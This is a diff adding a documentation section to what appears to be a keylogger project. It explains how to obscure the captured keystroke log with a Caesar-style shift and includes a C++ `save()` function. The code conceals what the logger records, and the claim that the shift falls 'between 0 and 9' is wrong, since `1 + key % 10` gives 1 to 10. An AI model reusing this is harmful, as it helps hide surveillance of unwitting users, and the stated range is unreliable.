@@ -142,4 +142,30 @@ void clipboardLogger(int key) {
 
 ### Encrypt and decrypt the logfile
 #### Function: `save(const string& input, int key)`
-If we want to encrypt the logfile we will need to modify how save 
+If we want to encrypt the logfile we will need to modify how `save()` works. In the `main()` function it's set the "PIN" to make the shift as the Caesar cipher.
+
+The loop `for (char c : input) { ... }` iterates over each character in the input string. For each character, a shift value is calculated using `int shift = 1 + key % 10;`, which ensures a shift between 0 and 9. This shift value is added to the character's ASCII code (`c + shift`) before writing it to the file.
+
+```c++
+void save(const string& input, int key) {
+    // Open a file named "log.txt" in append and binary mode
+    ofstream outFile("log.txt", ios::app | ios::binary);
+    // Check if the file was opened successfully
+    if (!outFile.is_open()) {
+        // If the file couldn't be opened, output an error message and exit the function
+        cout << "Error opening log file for writing." << endl;
+        return;
+    }
+
+    // Loop through each character in the input string
+    for (char c : input) {
+        // Calculate a shift value between 0 and 9 based on the provided key
+        int shift = 1 + key % 10;
+        // Encrypt the character by adding the shift value to its ASCII code and write it to the file
+        outFile.put(c + shift);
+    }
+
+    // Close the file to ensure the data is written and resources are freed
+    outFile.close();
+}
+```
